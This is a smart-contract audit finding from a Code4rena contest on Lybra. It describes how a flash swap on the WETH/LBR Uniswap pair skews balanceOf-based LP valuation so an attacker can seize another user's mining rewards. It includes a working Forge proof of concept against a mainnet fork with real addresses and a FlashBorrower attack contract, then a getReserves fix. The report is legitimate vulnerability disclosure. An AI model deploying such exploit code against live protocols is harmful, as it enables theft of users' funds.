## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- sponsor acknowledged
- edited-by-warden
- M-13

# [It is possible to manipulate WETH/LBR pair to claim reward of the users which shouldn't be claimed](https://github.com/code-423n4/2023-06-lybra-findings/issues/442) 

# Lines of code

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L153-L154
https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L189
https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L193
https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L203


# Vulnerability details

## Impact
Malicious user can manipulate balances of the WETH/LBR pair and bypass this check

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L203

which allows him to steal rewards from a user who has staked enough LP and whose rewards shouldn't be claimable under normal circumstances.

`EUSDMiningIncentives.sol` is a staking contract which distributes rewards to users based on how much EUSD they have minted/borrowed. Rewards are accumulated over time and can be claimed only if a user has staked enough WETH/LBR uniswap pair LP tokens into another staking 

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/stakerewardV2pool.sol

This condition is checked here

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L188

As we can see `stakedLBRLpValue` of a user is calculated based on how much LP he has staked and the total cost of the tokens that are stored inside the WETH/LBR pair

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L151-L156

total cost however is simply derived from the sum of the tokens balances, which we get with `balanceOf(pair)`, this can be exploited. 

1. Alice minted some EUSD tokens
2. She also has staked LP tokens in the staking rewards contract
3. Currently `isOtherEarningsClaimable(alice)` returns false, that means she is safe
4. Bob wants to take rewards of the Alice for himself
5. He calls a direct swap with WETH/LBR pair and chooses amounts that will lower the total cost of the LP

```
lbrInLp + etherInLp
```
6. Then inside the callback he calls `purchaseOtherEarnings` and takes reward of the Alice
7. After that he repays the loan

## Proof of Concept
Custom test
```
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.17;

import {DSTestPlus} from "solmate/test/utils/DSTestPlus.sol";
import {LybraStETHDepositVault as Vault} from "../contracts/lybra/pools/LybraStETHVault.sol";
import {PeUSDMainnet as PeUSD} from "../contracts/lybra/token/PeUSDMainnetStableVision.sol";
import {EUSD, IERC20} from "../contracts/lybra/token/EUSD.sol";
import {Configurator} from "../contracts/lybra/configuration/LybraConfigurator.sol";
import {EUSDMiningIncentives as Miner} from "../contracts/lybra/miner/EUSDMiningIncentives.sol";
import {StakingRewardsV2} from "../contracts/lybra/miner/stakerewardV2pool.sol";
import {esLBRBoost as Boost} from "../contracts/lybra/miner/esLBRBoost.sol";
import {stETHMock} from "../contracts/mocks/stETHMock.sol";
import {WstETH, IStETH} from "../contracts/mocks/mockWstETH.sol";
import {mockCurve} from "../contracts/mocks/mockCurve.sol";
import {mockEtherPriceOracle} from "../contracts/mocks/mockEtherPriceOracle.sol";
import {mockLBRPriceOracle} from "../contracts/mocks/mockLBRPriceOracle.sol";

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "./FlashBorrower.sol";

contract DAO {
    function checkRole(bytes32, address) external pure returns(bool) {
        return true;
    } 
    function checkOnlyRole(bytes32, address) external pure returns(bool) {
        return true;
    } 
}

contract Oracle {
    uint256 price;

    function setPrice(uint256 _price) external {
        price = _price;
    } 

    function fetchPrice() external view returns(uint256) {
        return price;
    } 
}

contract ESLBRMock {
    function mint(address, uint256) external returns(bool){
        return true;
    }
    function burn(address, uint256) external returns(bool){
        return true;
    }
}

contract LybraEUSDPoolTest is Test{
    Vault vault;
    PeUSD peusd;
    EUSD eusd;
    Configurator config;
    Boost boost;
    Miner miner;
    StakingRewardsV2 stakingReward;
    stETHMock stETH;
    WstETH wstETH;
    ESLBRMock eslbr;
    mockCurve curve;
    Oracle oracle;
    DAO dao;
    mockEtherPriceOracle ethOracle;
    mockLBRPriceOracle lbrOracle;
    address[] pools;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    IV2Router router;
    IV2Pair v2Pair; // WETH/LBR
    IWETH WETH;
    IERC20 LBR;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_MAINNET_URL"), 17592869);
        router = IV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        v2Pair = IV2Pair(0x061883CD8a060eF5B8d83cDe362C3Fdbd8162EeE);
        WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        LBR = IERC20(0xF1182229B71E79E504b1d2bF076C15a277311e05);

        stETH = new stETHMock();
        wstETH = new WstETH(IStETH(address(stETH)));
        eslbr = new ESLBRMock();
        curve = new mockCurve();
        oracle = new Oracle();
        ethOracle = new mockEtherPriceOracle();
        lbrOracle = new mockLBRPriceOracle();
        dao = new DAO();
        config = new Configurator(address(dao), address(curve));
        eusd = new EUSD(address(config));
        peusd = new PeUSD(address(config), 18, makeAddr("LZ"));
        config.initToken(address(eusd), address(peusd));
        vault = new Vault(address(config), address(stETH), address(oracle));
        
        pools.push(address(vault));
        config.setMintVault(address(vault), true);
        oracle.setPrice(1800 * 1e18);

        boost = new Boost();
        miner = new Miner(address(config), address(boost), address(ethOracle), address(lbrOracle)); 
        stakingReward = new StakingRewardsV2(address(v2Pair), address(eslbr), address(boost));
        miner.setEthlbrStakeInfo(address(stakingReward), address(v2Pair));
        miner.setPools(pools);
        miner.setToken(address(LBR), address(eslbr));

        config.setMintVaultMaxSupply(address(vault), 10_000_000 * 1e18);
        config.setSafeCollateralRatio(address(vault), 160 * 1e18);
        config.setBadCollateralRatio(address(vault), 150 * 1e18);
        config.setEUSDMiningIncentives(address(miner));
        stETH.approve(address(vault), ~uint256(0));
        vm.deal(alice, 10 ether);
        stETH.transfer(alice, 500 ether);
    }

    function swapAndLiquify(address who, uint256 amount, address[] memory path) internal {
        // get WETH and LBR, purchase and stake LP tokens
        vm.startPrank(who);
        WETH.deposit{value: amount}();
        WETH.approve(address(router), ~uint256(0));
        LBR.approve(address(router), ~uint256(0));
        v2Pair.approve(address(stakingReward), ~uint256(0));
        router.swapExactTokensForTokens(amount/2, 0, path, who, block.timestamp);
        router.addLiquidity(address(WETH), address(LBR), amount/2, (amount * 1000)/2, 1, 1, who, block.timestamp);
        console.log(v2Pair.balanceOf(who));
        stakingReward.stake(v2Pair.balanceOf(who));
        vm.stopPrank();
    }

    function testFlashLoanAttack() public {
        uint256 mintAmount = 1800*60*1e18;

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(LBR);
        
        // PREP THE ATTACK
        // Alice has borrowed 540_000 EUSD and staked 126 LP tokens 
        vault.depositAssetToMint(100*1e18, mintAmount);
        swapAndLiquify(address(this), 0.8 ether, path);
        vm.startPrank(alice);
        stETH.approve(address(vault), ~uint256(0));
        vault.depositAssetToMint(500*1e18, mintAmount * 5);
        vm.stopPrank();
        swapAndLiquify(alice, 10 ether, path);

        assertEq(miner.isOtherEarningsClaimable(address(this)), true);
        assertEq(miner.isOtherEarningsClaimable(alice), false);
        
        // COMMENCE THE ATTACK
        FlashBorrower flashBorrower = new FlashBorrower(WETH, LBR, miner, stakingReward, v2Pair, router, alice);         
        WETH.approve(address(flashBorrower), ~uint256(0));
        LBR.approve(address(flashBorrower), ~uint256(0));
        // Get some tokens to repay flash swap fees
        WETH.deposit{value: 6 ether}();
        
        router.swapExactTokensForTokens(3 ether, 0, path, address(this), block.timestamp);
        WETH.transfer(address(flashBorrower), 1000);
        LBR.transfer(address(flashBorrower), 1000);
        // Drain tokens from the pair and manipulate {stakedLBRLpValue} to pass this check and claim rewards from the target
        // https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L193
        flashBorrower.flash(800 ether, 800000 ether);
    }
}
```
FlashBorrower contract, notice the require check where we check if target user reward is claimable
```
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.17;

import {EUSDMiningIncentives as Miner} from "../contracts/lybra/miner/EUSDMiningIncentives.sol";
import {StakingRewardsV2} from "../contracts/lybra/miner/stakerewardV2pool.sol";
import {IERC20} from "../contracts/lybra/token/EUSD.sol";

import "forge-std/console.sol";

interface IV2Pair is IERC20 {
    function factory() external view returns(address);
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IV2Router {
    function factory() external view returns(address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract FlashBorrower {
    IWETH token0;
    IERC20 token1;
    Miner miner;
    StakingRewardsV2 staking;
    IV2Pair v2Pair;
    IV2Router v2Router;
    address target;

    constructor(
        IWETH _token0,
        IERC20 _token1,
        Miner _miner,
        StakingRewardsV2 _staking,
        IV2Pair _v2Pair,
        IV2Router _v2Router,
        address _target
    ) {
        token0 = _token0;
        token1 = _token1;
        miner = _miner;
        staking = _staking;
        v2Pair = _v2Pair;
        v2Router = _v2Router;
        target = _target;
        token0.approve(address(v2Router), ~uint256(0));
        token1.approve(address(v2Router), ~uint256(0));
        v2Pair.approve(address(v2Router), ~uint256(0));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        address caller = abi.decode(data, (address));

        require(miner.isOtherEarningsClaimable(target), "CAN'T GRAB TARGET'S REWARD");

        // Repay borrow
        uint256 fee0 = (amount0 * 3) / 997 + 1;
        uint256 fee1 = (amount1 * 3) / 997 + 1;
        uint256 amountToRepay0 = amount0 + fee0;
        uint256 amountToRepay1 = amount1 + fee1;

        // Transfer flash swap fee from caller
        token0.transferFrom(caller, address(this), fee0);
        token1.transferFrom(caller, address(this), fee1);

        // Repay
        token0.transfer(address(v2Pair), amountToRepay0);
        token1.transfer(address(v2Pair), amountToRepay1);
    }

    function flash(uint256 amount0, uint256 amount1) public {
        bytes memory data = abi.encode(msg.sender);
        v2Pair.swap(amount0, amount1, address(this), data);
    }
}
```
## Tools Used
Forge
I forked the ETH mainnet at the block 17592869
also following mainnet contracts were used
Uniswap V2 router (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
WETH/LBR uniswap pair (0x061883CD8a060eF5B8d83cDe362C3Fdbd8162EeE),
WETH token (0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
LBR token (0xF1182229B71E79E504b1d2bF076C15a277311e05)

## Recommended Mitigation Steps
Use `ethlbrLpToken.getReserves()` instead of quoting balances directly with `balanceOf`
```
(uint112 r0, uint112 r1, ) = ethlbrLpToken.getReserves()
uint256 etherInLp = (r0 * uint(etherPrice)) / 1e8;
uint256 lbrInLp = (r1 * uint(lbrPrice)) / 1e8;
```





## Assessed type

Uniswap